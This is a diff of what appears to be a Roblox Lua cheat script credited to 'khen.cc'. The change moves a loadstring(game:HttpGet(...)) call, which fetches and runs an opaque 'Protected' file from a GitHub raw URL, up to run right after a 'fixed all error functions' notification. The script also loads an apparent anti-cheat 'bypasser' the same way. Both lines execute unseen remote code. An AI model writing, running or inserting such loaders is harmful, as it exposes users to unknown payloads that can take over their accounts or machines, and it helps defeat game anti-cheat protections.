@@ -6,6 +6,8 @@ game.StarterGui:SetCore("SendNotification", {
     Text = "Script has fixed all error functions by khen.cc."; 
     Duration = 20;
 })
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/khenn791/script-khen/refs/heads/main/larplarpbypasser.txt"))()
 
@@ -2089,5 +2091,3 @@ if Misc.LowGfx == true then
 game:GetService("CorePackages").Packages:Destroy()
 end
 
-task.wait(0.5)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
